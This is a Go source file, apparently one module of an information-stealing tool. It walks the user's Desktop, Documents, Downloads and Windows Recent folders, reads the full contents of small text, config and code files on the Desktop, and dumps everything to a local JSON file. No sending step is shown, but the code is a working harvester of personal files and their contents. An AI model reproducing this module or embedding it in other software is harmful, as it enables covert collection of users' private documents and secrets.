// ============================================================
// commonfiles.go - Common File Extraction
// ============================================================
package commonfiles

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

type FileInfo struct {
	Path    string `json:"path"`
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
	Content string `json:"content,omitempty"`
}

type FileCollection struct {
	DesktopFiles  []FileInfo `json:"desktop_files"`
	DocumentsFiles []FileInfo `json:"documents_files"`
	DownloadsFiles []FileInfo `json:"downloads_files"`
	RecentFiles   []FileInfo `json:"recent_files"`
}

// Run collects common files
func Run() {
	log.Println("📁 Collecting common files...")
	
	collection := FileCollection{
		DesktopFiles:   collectDesktopFiles(),
		DocumentsFiles: collectDocumentsFiles(),
		DownloadsFiles: collectDownloadsFiles(),
		RecentFiles:    collectRecentFiles(),
	}
	
	saveFileCollection(collection)
}

// collectDesktopFiles collects files from Desktop
func collectDesktopFiles() []FileInfo {
	var files []FileInfo
	
	desktopPath := getDesktopPath()
	if desktopPath == "" {
		return files
	}
	
	entries, err := os.ReadDir(desktopPath)
	if err != nil {
		return files
	}
	
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		
		info, err := entry.Info()
		if err != nil {
			continue
		}
		
		file := FileInfo{
			Path:    filepath.Join(desktopPath, entry.Name()),
			Name:    entry.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
		}
		
		// Read file content if it's a text file and small
		if isTextFile(entry.Name()) && info.Size() < 1024*1024 {
			content, err := os.ReadFile(file.Path)
			if err == nil {
				file.Content = string(content)
			}
		}
		
		files = append(files, file)
	}
	
	log.Printf("📁 Found %d desktop files", len(files))
	return files
}

// collectDocumentsFiles collects files from Documents
func collectDocumentsFiles() []FileInfo {
	var files []FileInfo
	
	docPath := getDocumentsPath()
	if docPath == "" {
		return files
	}
	
	entries, err := os.ReadDir(docPath)
	if err != nil {
		return files
	}
	
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		
		info, err := entry.Info()
		if err != nil {
			continue
		}
		
		file := FileInfo{
			Path:    filepath.Join(docPath, entry.Name()),
			Name:    entry.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
		}
		
		files = append(files, file)
	}
	
	log.Printf("📁 Found %d documents files", len(files))
	return files
}

// collectDownloadsFiles collects files from Downloads
func collectDownloadsFiles() []FileInfo {
	var files []FileInfo
	
	downloadPath := getDownloadsPath()
	if downloadPath == "" {
		return files
	}
	
	entries, err := os.ReadDir(downloadPath)
	if err != nil {
		return files
	}
	
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		
		info, err := entry.Info()
		if err != nil {
			continue
		}
		
		file := FileInfo{
			Path:    filepath.Join(downloadPath, entry.Name()),
			Name:    entry.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
		}
		
		files = append(files, file)
	}
	
	log.Printf("📁 Found %d downloads files", len(files))
	return files
}

// collectRecentFiles collects recently accessed files
func collectRecentFiles() []FileInfo {
	var files []FileInfo
	
	if runtime.GOOS == "windows" {
		recentPath := filepath.Join(os.Getenv("APPDATA"), 
			"Microsoft", "Windows", "Recent")
		
		entries, err := os.ReadDir(recentPath)
		if err != nil {
			return files
		}
		
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			
			info, err := entry.Info()
			if err != nil {
				continue
			}
			
			file := FileInfo{
				Path:    filepath.Join(recentPath, entry.Name()),
				Name:    entry.Name(),
				Size:    info.Size(),
				ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
			}
			
			files = append(files, file)
		}
	}
	
	return files
}

// getDesktopPath returns the Desktop path
func getDesktopPath() string {
	if runtime.GOOS == "windows" {
		return filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	}
	return filepath.Join(os.Getenv("HOME"), "Desktop")
}

// getDocumentsPath returns the Documents path
func getDocumentsPath() string {
	if runtime.GOOS == "windows" {
		return filepath.Join(os.Getenv("USERPROFILE"), "Documents")
	}
	return filepath.Join(os.Getenv("HOME"), "Documents")
}

// getDownloadsPath returns the Downloads path
func getDownloadsPath() string {
	if runtime.GOOS == "windows" {
		return filepath.Join(os.Getenv("USERPROFILE"), "Downloads")
	}
	return filepath.Join(os.Getenv("HOME"), "Downloads")
}

// isTextFile checks if a file is likely a text file
func isTextFile(filename string) bool {
	ext := strings.ToLower(filepath.Ext(filename))
	textExts := []string{
		".txt", ".log", ".cfg", ".conf", ".ini", ".xml", ".json",
		".yml", ".yaml", ".csv", ".md", ".rst", ".py", ".js",
		".html", ".css", ".go", ".c", ".cpp", ".h", ".java",
	}
	
	for _, textExt := range textExts {
		if ext == textExt {
			return true
		}
	}
	return false
}

// saveFileCollection saves the file collection to JSON
func saveFileCollection(collection FileCollection) {
	data, err := json.MarshalIndent(collection, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal file collection: %v", err)
		return
	}
	
	if err := os.WriteFile("common_files.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save file collection: %v", err)
		return
	}
	
	log.Printf("✅ Common files saved to common_files.json")
}